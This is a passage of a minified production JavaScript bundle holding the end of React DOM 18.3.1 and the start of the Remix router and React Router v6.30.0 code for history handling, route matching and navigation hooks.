r.componentDidCatch=="function"&&(eo===null||!eo.has(r))){n=Pl(t,n),n=yA(e,n,1),e=Xs(e,n,1),n=or(),e!==null&&(sh(e,1,n),Er(e,n));break}}e=e.return}}function SN(n,e,t){var r=n.pingCache;r!==null&&r.delete(e),e=or(),n.pingedLanes|=n.suspendedLanes&t,bn===n&&(jn&t)===t&&(mn===4||mn===3&&(jn&130023424)===jn&&500>rn()-kw?ea(n,0):xw|=t),Er(n,e)}function BA(n,e){e===0&&(n.mode&1?(e=Hh,Hh<<=1,!(Hh&130023424)&&(Hh=4194304)):e=1);var t=or();n=us(n,e),n!==null&&(sh(n,e,t),Er(n,t))}function TN(n){var e=n.memoizedState,t=0;e!==null&&(t=e.retryLane),BA(n,t)}function AN(n,e){var t=0;switch(n.tag){case 13:var r=n.stateNode,i=n.memoizedState;i!==null&&(t=i.retryLane);break;case 19:r=n.stateNode;break;default:throw Error(le(314))}r!==null&&r.delete(e),BA(n,t)}var UA;UA=function(n,e,t){if(n!==null)if(n.memoizedProps!==e.pendingProps||vr.current)wr=!0;else{if(!(n.lanes&t)&&!(e.flags&128))return wr=!1,fN(n,e,t);wr=!!(n.flags&131072)}else wr=!1,jt&&e.flags&1048576&&zT(e,ad,e.index);switch(e.lanes=0,e.tag){case 2:var r=e.type;kf(n,e),n=e.pendingProps;var i=Cl(e,nr.current);wl(e,t),i=Ew(null,e,r,n,i,t);var s=Iw();return e.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(e.tag=1,e.memoizedState=null,e.updateQueue=null,_r(r)?(s=!0,sd(e)):s=!1,e.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,mw(e),i.updater=up,e.stateNode=i,i._reactInternals=e,y0(e,r,n,t),e=_0(null,e,r,!0,s,t)):(e.tag=0,jt&&s&&cw(e),ir(null,e,i,t),e=e.child),e;case 16:r=e.elementType;e:{switch(kf(n,e),n=e.pendingProps,i=r._init,r=i(r._payload),e.type=r,i=e.tag=xN(r),n=ni(r,n),i){case 0:e=v0(null,e,r,n,t);break e;case 1:e=V_(null,e,r,n,t);break e;case 11:e=U_(null,e,r,n,t);break e;case 14:e=j_(null,e,r,ni(r.type,n),t);break e}throw Error(le(306,r,""))}return e;case 0:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ni(r,i),v0(n,e,r,i,t);case 1:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ni(r,i),V_(n,e,r,i,t);case 3:e:{if(EA(e),n===null)throw Error(le(387));r=e.pendingProps,s=e.memoizedState,i=s.element,GT(n,e),ud(e,r,null,t);var o=e.memoizedState;if(r=o.element,s.isDehydrated)if(s={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},e.updateQueue.baseState=s,e.memoizedState=s,e.flags&256){i=Pl(Error(le(423)),e),e=F_(n,e,r,t,i);break e}else if(r!==i){i=Pl(Error(le(424)),e),e=F_(n,e,r,t,i);break e}else for(Cr=Js(e.stateNode.containerInfo.firstChild),Mr=e,jt=!0,si=null,t=qT(e,null,r,t),e.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(Rl(),r===i){e=hs(n,e,t);break e}ir(n,e,r,t)}e=e.child}return e;case 5:return QT(e),n===null&&p0(e),r=e.type,i=e.pendingProps,s=n!==null?n.memoizedProps:null,o=i.children,c0(r,i)?o=null:s!==null&&c0(r,s)&&(e.flags|=32),_A(n,e),ir(n,e,o,t),e.child;case 6:return n===null&&p0(e),null;case 13:return IA(n,e,t);case 4:return yw(e,e.stateNode.containerInfo),r=e.pendingProps,n===null?e.child=Ml(e,null,r,t):ir(n,e,r,t),e.child;case 11:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ni(r,i),U_(n,e,r,i,t);case 7:return ir(n,e,e.pendingProps,t),e.child;case 8:return ir(n,e,e.pendingProps.children,t),e.child;case 12:return ir(n,e,e.pendingProps.children,t),e.child;case 10:e:{if(r=e.type._context,i=e.pendingProps,s=e.memoizedProps,o=i.value,Tt(ld,r._currentValue),r._currentValue=o,s!==null)if(pi(s.value,o)){if(s.children===i.children&&!vr.current){e=hs(n,e,t);break e}}else for(s=e.child,s!==null&&(s.return=e);s!==null;){var a=s.dependencies;if(a!==null){o=s.child;for(var l=a.firstContext;l!==null;){if(l.context===r){if(s.tag===1){l=ss(-1,t&-t),l.tag=2;var u=s.updateQueue;if(u!==null){u=u.shared;var h=u.pending;h===null?l.next=l:(l.next=h.next,h.next=l),u.pending=l}}s.lanes|=t,l=s.alternate,l!==null&&(l.lanes|=t),g0(s.return,t,e),a.lanes|=t;break}l=l.next}}else if(s.tag===10)o=s.type===e.type?null:s.child;else if(s.tag===18){if(o=s.return,o===null)throw Error(le(341));o.lanes|=t,a=o.alternate,a!==null&&(a.lanes|=t),g0(o,t,e),o=s.sibling}else o=s.child;if(o!==null)o.return=s;else for(o=s;o!==null;){if(o===e){o=null;break}if(s=o.sibling,s!==null){s.return=o.return,o=s;break}o=o.return}s=o}ir(n,e,i.children,t),e=e.child}return e;case 9:return i=e.type,r=e.pendingProps.children,wl(e,t),i=Qr(i),r=r(i),e.flags|=1,ir(n,e,r,t),e.child;case 14:return r=e.type,i=ni(r,e.pendingProps),i=ni(r.type,i),j_(n,e,r,i,t);case 15:return wA(n,e,e.type,e.pendingProps,t);case 17:return r=e.type,i=e.pendingProps,i=e.elementType===r?i:ni(r,i),kf(n,e),e.tag=1,_r(r)?(n=!0,sd(e)):n=!1,wl(e,t),gA(e,r,i),y0(e,r,i,t),_0(null,e,r,!0,n,t);case 19:return SA(n,e,t);case 22:return vA(n,e,t)}throw Error(le(156,e.tag))};function jA(n,e){return fT(n,e)}function bN(n,e,t,r){this.tag=n,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=e,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Hr(n,e,t,r){return new bN(n,e,t,r)}function Nw(n){return n=n.prototype,!(!n||!n.isReactComponent)}function xN(n){if(typeof n=="function")return Nw(n)?1:0;if(n!=null){if(n=n.$$typeof,n===Zy)return 11;if(n===Jy)return 14}return 2}function no(n,e){var t=n.alternate;return t===null?(t=Hr(n.tag,e,n.key,n.mode),t.elementType=n.elementType,t.type=n.type,t.stateNode=n.stateNode,t.alternate=n,n.alternate=t):(t.pendingProps=e,t.type=n.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=n.flags&14680064,t.childLanes=n.childLanes,t.lanes=n.lanes,t.child=n.child,t.memoizedProps=n.memoizedProps,t.memoizedState=n.memoizedState,t.updateQueue=n.updateQueue,e=n.dependencies,t.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext},t.sibling=n.sibling,t.index=n.index,t.ref=n.ref,t}function Mf(n,e,t,r,i,s){var o=2;if(r=n,typeof n=="function")Nw(n)&&(o=1);else if(typeof n=="string")o=5;else e:switch(n){case Ja:return ta(t.children,i,s,e);case Yy:o=8,i|=8;break;case Fm:return n=Hr(12,t,e,i|2),n.elementType=Fm,n.lanes=s,n;case zm:return n=Hr(13,t,e,i),n.elementType=zm,n.lanes=s,n;case Wm:return n=Hr(19,t,e,i),n.elementType=Wm,n.lanes=s,n;case QS:return dp(t,i,s,e);default:if(typeof n=="object"&&n!==null)switch(n.$$typeof){case KS:o=10;break e;case GS:o=9;break e;case Zy:o=11;break e;case Jy:o=14;break e;case Ps:o=16,r=null;break e}throw Error(le(130,n==null?n:typeof n,""))}return e=Hr(o,t,e,i),e.elementType=n,e.type=r,e.lanes=s,e}function ta(n,e,t,r){return n=Hr(7,n,r,e),n.lanes=t,n}function dp(n,e,t,r){return n=Hr(22,n,r,e),n.elementType=QS,n.lanes=t,n.stateNode={isHidden:!1},n}function Wg(n,e,t){return n=Hr(6,n,null,e),n.lanes=t,n}function $g(n,e,t){return e=Hr(4,n.children!==null?n.children:[],n.key,e),e.lanes=t,e.stateNode={containerInfo:n.containerInfo,pendingChildren:null,implementation:n.implementation},e}function kN(n,e,t,r,i){this.tag=e,this.containerInfo=n,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Tg(0),this.expirationTimes=Tg(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Tg(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Pw(n,e,t,r,i,s,o,a,l){return n=new kN(n,e,t,a,l),e===1?(e=1,s===!0&&(e|=8)):e=0,s=Hr(3,null,null,e),n.current=s,s.stateNode=n,s.memoizedState={element:r,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},mw(s),n}function CN(n,e,t){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Za,key:r==null?null:""+r,children:n,containerInfo:e,implementation:t}}function VA(n){if(!n)return po;n=n._reactInternals;e:{if(va(n)!==n||n.tag!==1)throw Error(le(170));var e=n;do{switch(e.tag){case 3:e=e.stateNode.context;break e;case 1:if(_r(e.type)){e=e.stateNode.__reactInternalMemoizedMergedChildContext;break e}}e=e.return}while(e!==null);throw Error(le(171))}if(n.tag===1){var t=n.type;if(_r(t))return VT(n,t,e)}return e}function FA(n,e,t,r,i,s,o,a,l){return n=Pw(t,r,!0,n,i,s,o,a,l),n.context=VA(null),t=n.current,r=or(),i=to(t),s=ss(r,i),s.callback=e??null,Xs(t,s,i),n.current.lanes=i,sh(n,i,r),Er(n,r),n}function pp(n,e,t,r){var i=e.current,s=or(),o=to(i);return t=VA(t),e.context===null?e.context=t:e.pendingContext=t,e=ss(s,o),e.payload={element:n},r=r===void 0?null:r,r!==null&&(e.callback=r),n=Xs(i,e,o),n!==null&&(ui(n,i,o,s),Af(n,i,o)),o}function wd(n){if(n=n.current,!n.child)return null;switch(n.child.tag){case 5:return n.child.stateNode;default:return n.child.stateNode}}function Z_(n,e){if(n=n.memoizedState,n!==null&&n.dehydrated!==null){var t=n.retryLane;n.retryLane=t!==0&&t<e?t:e}}function Lw(n,e){Z_(n,e),(n=n.alternate)&&Z_(n,e)}function RN(){return null}var zA=typeof reportError=="function"?reportError:function(n){console.error(n)};function Dw(n){this._internalRoot=n}gp.prototype.render=Dw.prototype.render=function(n){var e=this._internalRoot;if(e===null)throw Error(le(409));pp(n,e,null,null)};gp.prototype.unmount=Dw.prototype.unmount=function(){var n=this._internalRoot;if(n!==null){this._internalRoot=null;var e=n.containerInfo;ca(function(){pp(null,n,null,null)}),e[cs]=null}};function gp(n){this._internalRoot=n}gp.prototype.unstable_scheduleHydration=function(n){if(n){var e=vT();n={blockedOn:null,target:n,priority:e};for(var t=0;t<Ds.length&&e!==0&&e<Ds[t].priority;t++);Ds.splice(t,0,n),t===0&&ET(n)}};function Ow(n){return!(!n||n.nodeType!==1&&n.nodeType!==9&&n.nodeType!==11)}function mp(n){return!(!n||n.nodeType!==1&&n.nodeType!==9&&n.nodeType!==11&&(n.nodeType!==8||n.nodeValue!==" react-mount-point-unstable "))}function J_(){}function MN(n,e,t,r,i){if(i){if(typeof r=="function"){var s=r;r=function(){var u=wd(o);s.call(u)}}var o=FA(e,r,n,0,null,!1,!1,"",J_);return n._reactRootContainer=o,n[cs]=o.current,xu(n.nodeType===8?n.parentNode:n),ca(),o}for(;i=n.lastChild;)n.removeChild(i);if(typeof r=="function"){var a=r;r=function(){var u=wd(l);a.call(u)}}var l=Pw(n,0,!1,null,null,!1,!1,"",J_);return n._reactRootContainer=l,n[cs]=l.current,xu(n.nodeType===8?n.parentNode:n),ca(function(){pp(e,l,t,r)}),l}function yp(n,e,t,r,i){var s=t._reactRootContainer;if(s){var o=s;if(typeof i=="function"){var a=i;i=function(){var l=wd(o);a.call(l)}}pp(e,o,n,i)}else o=MN(t,e,n,i,r);return wd(o)}yT=function(n){switch(n.tag){case 3:var e=n.stateNode;if(e.current.memoizedState.isDehydrated){var t=Hc(e.pendingLanes);t!==0&&(tw(e,t|1),Er(e,rn()),!(Je&6)&&(Ll=rn()+500,To()))}break;case 13:ca(function(){var r=us(n,1);if(r!==null){var i=or();ui(r,n,1,i)}}),Lw(n,1)}};nw=function(n){if(n.tag===13){var e=us(n,134217728);if(e!==null){var t=or();ui(e,n,134217728,t)}Lw(n,134217728)}};wT=function(n){if(n.tag===13){var e=to(n),t=us(n,e);if(t!==null){var r=or();ui(t,n,e,r)}Lw(n,e)}};vT=function(){return ft};_T=function(n,e){var t=ft;try{return ft=n,e()}finally{ft=t}};Xm=function(n,e,t){switch(e){case"input":if(qm(n,t),e=t.name,t.type==="radio"&&e!=null){for(t=n;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+e)+'][type="radio"]'),e=0;e<t.length;e++){var r=t[e];if(r!==n&&r.form===n.form){var i=ap(r);if(!i)throw Error(le(90));ZS(r),qm(r,i)}}}break;case"textarea":XS(n,t);break;case"select":e=t.value,e!=null&&pl(n,!!t.multiple,e,!1)}};oT=Cw;aT=ca;var NN={usingClientEntryPoint:!1,Events:[ah,nl,ap,iT,sT,Cw]},jc={findFiberByHostInstance:$o,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},PN={bundleType:jc.bundleType,version:jc.version,rendererPackageName:jc.rendererPackageName,rendererConfig:jc.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:vs.ReactCurrentDispatcher,findHostInstanceByFiber:function(n){return n=uT(n),n===null?null:n.stateNode},findFiberByHostInstance:jc.findFiberByHostInstance||RN,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var nf=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!nf.isDisabled&&nf.supportsFiber)try{rp=nf.inject(PN),bi=nf}catch{}}Pr.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=NN;Pr.createPortal=function(n,e){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Ow(e))throw Error(le(200));return CN(n,e,null,t)};Pr.createRoot=function(n,e){if(!Ow(n))throw Error(le(299));var t=!1,r="",i=zA;return e!=null&&(e.unstable_strictMode===!0&&(t=!0),e.identifierPrefix!==void 0&&(r=e.identifierPrefix),e.onRecoverableError!==void 0&&(i=e.onRecoverableError)),e=Pw(n,1,!1,null,null,t,!1,r,i),n[cs]=e.current,xu(n.nodeType===8?n.parentNode:n),new Dw(e)};Pr.findDOMNode=function(n){if(n==null)return null;if(n.nodeType===1)return n;var e=n._reactInternals;if(e===void 0)throw typeof n.render=="function"?Error(le(188)):(n=Object.keys(n).join(","),Error(le(268,n)));return n=uT(e),n=n===null?null:n.stateNode,n};Pr.flushSync=function(n){return ca(n)};Pr.hydrate=function(n,e,t){if(!mp(e))throw Error(le(200));return yp(null,n,e,!0,t)};Pr.hydrateRoot=function(n,e,t){if(!Ow(n))throw Error(le(405));var r=t!=null&&t.hydratedSources||null,i=!1,s="",o=zA;if(t!=null&&(t.unstable_strictMode===!0&&(i=!0),t.identifierPrefix!==void 0&&(s=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),e=FA(e,null,n,1,t??null,i,!1,s,o),n[cs]=e.current,xu(n),r)for(n=0;n<r.length;n++)t=r[n],i=t._getVersion,i=i(t._source),e.mutableSourceEagerHydrationData==null?e.mutableSourceEagerHydrationData=[t,i]:e.mutableSourceEagerHydrationData.push(t,i);return new gp(e)};Pr.render=function(n,e,t){if(!mp(e))throw Error(le(200));return yp(null,n,e,!1,t)};Pr.unmountComponentAtNode=function(n){if(!mp(n))throw Error(le(40));return n._reactRootContainer?(ca(function(){yp(null,null,n,!1,function(){n._reactRootContainer=null,n[cs]=null})}),!0):!1};Pr.unstable_batchedUpdates=Cw;Pr.unstable_renderSubtreeIntoContainer=function(n,e,t,r){if(!mp(t))throw Error(le(200));if(n==null||n._reactInternals===void 0)throw Error(le(38));return yp(n,e,t,!1,r)};Pr.version="18.3.1-next-f1338f8080-20240426";function WA(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(WA)}catch(n){console.error(n)}}WA(),WS.exports=Pr;var $A=WS.exports,X_=$A;jm.createRoot=X_.createRoot,jm.hydrateRoot=X_.hydrateRoot;/**
 * @remix-run/router v1.23.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ou(){return Ou=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Ou.apply(this,arguments)}var Ws;(function(n){n.Pop="POP",n.Push="PUSH",n.Replace="REPLACE"})(Ws||(Ws={}));const eE="popstate";function LN(n){n===void 0&&(n={});function e(r,i){let{pathname:s,search:o,hash:a}=r.location;return N0("",{pathname:s,search:o,hash:a},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function t(r,i){return typeof i=="string"?i:vd(i)}return ON(e,t,null,n)}function pn(n,e){if(n===!1||n===null||typeof n>"u")throw new Error(e)}function HA(n,e){if(!n){typeof console<"u"&&console.warn(e);try{throw new Error(e)}catch{}}}function DN(){return Math.random().toString(36).substr(2,8)}function tE(n,e){return{usr:n.state,key:n.key,idx:e}}function N0(n,e,t,r){return t===void 0&&(t=null),Ou({pathname:typeof n=="string"?n:n.pathname,search:"",hash:""},typeof e=="string"?rc(e):e,{state:t,key:e&&e.key||r||DN()})}function vd(n){let{pathname:e="/",search:t="",hash:r=""}=n;return t&&t!=="?"&&(e+=t.charAt(0)==="?"?t:"?"+t),r&&r!=="#"&&(e+=r.charAt(0)==="#"?r:"#"+r),e}function rc(n){let e={};if(n){let t=n.indexOf("#");t>=0&&(e.hash=n.substr(t),n=n.substr(0,t));let r=n.indexOf("?");r>=0&&(e.search=n.substr(r),n=n.substr(0,r)),n&&(e.pathname=n)}return e}function ON(n,e,t,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:s=!1}=r,o=i.history,a=Ws.Pop,l=null,u=h();u==null&&(u=0,o.replaceState(Ou({},o.state,{idx:u}),""));function h(){return(o.state||{idx:null}).idx}function f(){a=Ws.Pop;let I=h(),A=I==null?null:I-u;u=I,l&&l({action:a,location:k.location,delta:A})}function p(I,A){a=Ws.Push;let b=N0(k.location,I,A);t&&t(b,I),u=h()+1;let E=tE(b,u),O=k.createHref(b);try{o.pushState(E,"",O)}catch(W){if(W instanceof DOMException&&W.name==="DataCloneError")throw W;i.location.assign(O)}s&&l&&l({action:a,location:k.location,delta:1})}function w(I,A){a=Ws.Replace;let b=N0(k.location,I,A);t&&t(b,I),u=h();let E=tE(b,u),O=k.createHref(b);o.replaceState(E,"",O),s&&l&&l({action:a,location:k.location,delta:0})}function x(I){let A=i.location.origin!=="null"?i.location.origin:i.location.href,b=typeof I=="string"?I:vd(I);return b=b.replace(/ $/,"%20"),pn(A,"No window.location.(origin|href) available to create URL for href: "+b),new URL(b,A)}let k={get action(){return a},get location(){return n(i,o)},listen(I){if(l)throw new Error("A history only accepts one active listener");return i.addEventListener(eE,f),l=I,()=>{i.removeEventListener(eE,f),l=null}},createHref(I){return e(i,I)},createURL:x,encodeLocation(I){let A=x(I);return{pathname:A.pathname,search:A.search,hash:A.hash}},push:p,replace:w,go(I){return o.go(I)}};return k}var nE;(function(n){n.data="data",n.deferred="deferred",n.redirect="redirect",n.error="error"})(nE||(nE={}));function BN(n,e,t){return t===void 0&&(t="/"),UN(n,e,t,!1)}function UN(n,e,t,r){let i=typeof e=="string"?rc(e):e,s=Bw(i.pathname||"/",t);if(s==null)return null;let o=qA(n);jN(o);let a=null;for(let l=0;a==null&&l<o.length;++l){let u=YN(s);a=GN(o[l],u,r)}return a}function qA(n,e,t,r){e===void 0&&(e=[]),t===void 0&&(t=[]),r===void 0&&(r="");let i=(s,o,a)=>{let l={relativePath:a===void 0?s.path||"":a,caseSensitive:s.caseSensitive===!0,childrenIndex:o,route:s};l.relativePath.startsWith("/")&&(pn(l.relativePath.startsWith(r),'Absolute route path "'+l.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),l.relativePath=l.relativePath.slice(r.length));let u=ro([r,l.relativePath]),h=t.concat(l);s.children&&s.children.length>0&&(pn(s.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+u+'".')),qA(s.children,e,h,u)),!(s.path==null&&!s.index)&&e.push({path:u,score:qN(u,s.index),routesMeta:h})};return n.forEach((s,o)=>{var a;if(s.path===""||!((a=s.path)!=null&&a.includes("?")))i(s,o);else for(let l of KA(s.path))i(s,o,l)}),e}function KA(n){let e=n.split("/");if(e.length===0)return[];let[t,...r]=e,i=t.endsWith("?"),s=t.replace(/\?$/,"");if(r.length===0)return i?[s,""]:[s];let o=KA(r.join("/")),a=[];return a.push(...o.map(l=>l===""?s:[s,l].join("/"))),i&&a.push(...o),a.map(l=>n.startsWith("/")&&l===""?"/":l)}function jN(n){n.sort((e,t)=>e.score!==t.score?t.score-e.score:KN(e.routesMeta.map(r=>r.childrenIndex),t.routesMeta.map(r=>r.childrenIndex)))}const VN=/^:[\w-]+$/,FN=3,zN=2,WN=1,$N=10,HN=-2,rE=n=>n==="*";function qN(n,e){let t=n.split("/"),r=t.length;return t.some(rE)&&(r+=HN),e&&(r+=zN),t.filter(i=>!rE(i)).reduce((i,s)=>i+(VN.test(s)?FN:s===""?WN:$N),r)}function KN(n,e){return n.length===e.length&&n.slice(0,-1).every((r,i)=>r===e[i])?n[n.length-1]-e[e.length-1]:0}function GN(n,e,t){t===void 0&&(t=!1);let{routesMeta:r}=n,i={},s="/",o=[];for(let a=0;a<r.length;++a){let l=r[a],u=a===r.length-1,h=s==="/"?e:e.slice(s.length)||"/",f=iE({path:l.relativePath,caseSensitive:l.caseSensitive,end:u},h),p=l.route;if(!f&&u&&t&&!r[r.length-1].route.index&&(f=iE({path:l.relativePath,caseSensitive:l.caseSensitive,end:!1},h)),!f)return null;Object.assign(i,f.params),o.push({params:i,pathname:ro([s,f.pathname]),pathnameBase:eP(ro([s,f.pathnameBase])),route:p}),f.pathnameBase!=="/"&&(s=ro([s,f.pathnameBase]))}return o}function iE(n,e){typeof n=="string"&&(n={path:n,caseSensitive:!1,end:!0});let[t,r]=QN(n.path,n.caseSensitive,n.end),i=e.match(t);if(!i)return null;let s=i[0],o=s.replace(/(.)\/+$/,"$1"),a=i.slice(1);return{params:r.reduce((u,h,f)=>{let{paramName:p,isOptional:w}=h;if(p==="*"){let k=a[f]||"";o=s.slice(0,s.length-k.length).replace(/(.)\/+$/,"$1")}const x=a[f];return w&&!x?u[p]=void 0:u[p]=(x||"").replace(/%2F/g,"/"),u},{}),pathname:s,pathnameBase:o,pattern:n}}function QN(n,e,t){e===void 0&&(e=!1),t===void 0&&(t=!0),HA(n==="*"||!n.endsWith("*")||n.endsWith("/*"),'Route path "'+n+'" will be treated as if it were '+('"'+n.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+n.replace(/\*$/,"/*")+'".'));let r=[],i="^"+n.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,a,l)=>(r.push({paramName:a,isOptional:l!=null}),l?"/?([^\\/]+)?":"/([^\\/]+)"));return n.endsWith("*")?(r.push({paramName:"*"}),i+=n==="*"||n==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?i+="\\/*$":n!==""&&n!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,e?void 0:"i"),r]}function YN(n){try{return n.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(e){return HA(!1,'The URL path "'+n+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+e+").")),n}}function Bw(n,e){if(e==="/")return n;if(!n.toLowerCase().startsWith(e.toLowerCase()))return null;let t=e.endsWith("/")?e.length-1:e.length,r=n.charAt(t);return r&&r!=="/"?null:n.slice(t)||"/"}function ZN(n,e){e===void 0&&(e="/");let{pathname:t,search:r="",hash:i=""}=typeof n=="string"?rc(n):n;return{pathname:t?t.startsWith("/")?t:JN(t,e):e,search:tP(r),hash:nP(i)}}function JN(n,e){let t=e.replace(/\/+$/,"").split("/");return n.split("/").forEach(i=>{i===".."?t.length>1&&t.pop():i!=="."&&t.push(i)}),t.length>1?t.join("/"):"/"}function Hg(n,e,t,r){return"Cannot include a '"+n+"' character in a manually specified "+("`to."+e+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function XN(n){return n.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function GA(n,e){let t=XN(n);return e?t.map((r,i)=>i===t.length-1?r.pathname:r.pathnameBase):t.map(r=>r.pathnameBase)}function QA(n,e,t,r){r===void 0&&(r=!1);let i;typeof n=="string"?i=rc(n):(i=Ou({},n),pn(!i.pathname||!i.pathname.includes("?"),Hg("?","pathname","search",i)),pn(!i.pathname||!i.pathname.includes("#"),Hg("#","pathname","hash",i)),pn(!i.search||!i.search.includes("#"),Hg("#","search","hash",i)));let s=n===""||i.pathname==="",o=s?"/":i.pathname,a;if(o==null)a=t;else{let f=e.length-1;if(!r&&o.startsWith("..")){let p=o.split("/");for(;p[0]==="..";)p.shift(),f-=1;i.pathname=p.join("/")}a=f>=0?e[f]:"/"}let l=ZN(i,a),u=o&&o!=="/"&&o.endsWith("/"),h=(s||o===".")&&t.endsWith("/");return!l.pathname.endsWith("/")&&(u||h)&&(l.pathname+="/"),l}const ro=n=>n.join("/").replace(/\/\/+/g,"/"),eP=n=>n.replace(/\/+$/,"").replace(/^\/*/,"/"),tP=n=>!n||n==="?"?"":n.startsWith("?")?n:"?"+n,nP=n=>!n||n==="#"?"":n.startsWith("#")?n:"#"+n;function rP(n){return n!=null&&typeof n.status=="number"&&typeof n.statusText=="string"&&typeof n.internal=="boolean"&&"data"in n}const YA=["post","put","patch","delete"];new Set(YA);const iP=["get",...YA];new Set(iP);/**
 * React Router v6.30.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Bu(){return Bu=Object.assign?Object.assign.bind():function(n){for(var e=1;e<arguments.length;e++){var t=arguments[e];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(n[r]=t[r])}return n},Bu.apply(this,arguments)}const Uw=Y.createContext(null),sP=Y.createContext(null),_a=Y.createContext(null),wp=Y.createContext(null),Ea=Y.createContext({outlet:null,matches:[],isDataRoute:!1}),ZA=Y.createContext(null);function oP(n,e){let{relative:t}=e===void 0?{}:e;ch()||pn(!1);let{basename:r,navigator:i}=Y.useContext(_a),{hash:s,pathname:o,search:a}=XA(n,{relative:t}),l=o;return r!=="/"&&(l=o==="/"?r:ro([r,o])),i.createHref({pathname:l,search:a,hash:s})}function ch(){return Y.useContext(wp)!=null}function vp(){return ch()||pn(!1),Y.useContext(wp).location}function JA(n){Y.useContext(_a).static||Y.useLayoutEffect(n)}function jw(){let{isDataRoute:n}=Y.useContext(Ea);return n?vP():aP()}function aP(){ch()||pn(!1);let n=Y.useContext(Uw),{basename:e,future:t,navigator:r}=Y.useContext(_a),{matches:i}=Y.useContext(Ea),{pathname:s}=vp(),o=JSON.stringify(GA(i,t.v7_relativeSplatPath)),a=Y.useRef(!1);return JA(()=>{a.current=!0}),Y.useCallback(function(u,h){if(h===void 0&&(h={}),!a.current)return;if(typeof u=="number"){r.go(u);return}let f=QA(u,JSON.parse(o),s,h.relative==="path");n==null&&e!=="/"&&(f.pathname=f.pathname==="/"?e:ro([e,f.pathname])),(h.replace?r.replace:r.push)(f,h.state,h)},[e,r,o,s,n])}function XA(n,e){let{relative:t}=e===void 0?{}:e,{future:r}=Y.useContext(_a),{matches:i}=Y.useContext(Ea),{pathname:s}=vp(),o=JSON.stringify(GA(i,r.v7_relativeSplatPath));return Y.useMemo(()=>QA(n,JSON.parse(o),s,t==="path"),[n,o,s,t])}function lP(n,e){return cP(n,e)}function cP(n,e,t,r){ch()||pn(!1);let{navigator:i,static:s}=Y.useContext(_a),{matches:o}=Y.useContext(Ea),a=o[o.length-1],l=a?a.params:{};a&&a.pathname;let u=a?a.pathnameBase:"/";a&&a.route;let h=vp(),f;if(e){var p;let A=typeof e=="string"?rc(e):e;u==="/"||(p=A.pathname)!=null&&p.startsWith(u)||pn(!1),f=A}else f=h;let w=f.pathname||"/",x=w;if(u!=="/"){let A=u.replace(/^\//,"").split("/");x="/"+w.replace(/^\//,"").split("/").slice(A.length).join("/")}let 